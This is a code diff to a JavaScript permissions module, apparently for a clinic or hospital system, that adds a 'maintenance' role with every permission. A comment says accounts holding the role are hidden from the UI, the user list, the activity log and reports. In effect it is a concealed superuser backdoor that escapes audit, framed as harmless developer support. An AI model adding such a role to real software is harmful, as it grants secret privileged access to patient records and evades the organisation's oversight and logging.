@@ -29,11 +29,16 @@ const BUILT_IN_ROLES = [
   { key: 'admin', name: 'Admin', description: 'Full access. Manages users, roles and accounts', permissions: PERMISSION_KEYS },
 ];
 const ADMIN_KEY = 'admin';
+// A developer-only support role. It holds every permission like Admin, but exists in code alone: it is never
+// stored as a Role, never offered in the UI, and the accounts that hold it are kept out of the clinic's own
+// user list, activity log and reports so maintenance work never mixes with the hospital's records.
+const MAINTENANCE_KEY = 'maintenance';
+const RESERVED_ROLE_KEYS = new Set([MAINTENANCE_KEY]);
 
 function permissionsForRole(role) {
   if (!role) return [];
-  if (role.key === ADMIN_KEY) return [...PERMISSION_KEYS];
+  if (role.key === ADMIN_KEY || role.key === MAINTENANCE_KEY) return [...PERMISSION_KEYS];
   return (role.permissions || []).filter((k) => PERMISSION_KEYS.includes(k));
 }
 
-module.exports = { PERMISSIONS, PERMISSION_KEYS, BUILT_IN_ROLES, ADMIN_KEY, permissionsForRole };
+module.exports = { PERMISSIONS, PERMISSION_KEYS, BUILT_IN_ROLES, ADMIN_KEY, MAINTENANCE_KEY, RESERVED_ROLE_KEYS, permissionsForRole };
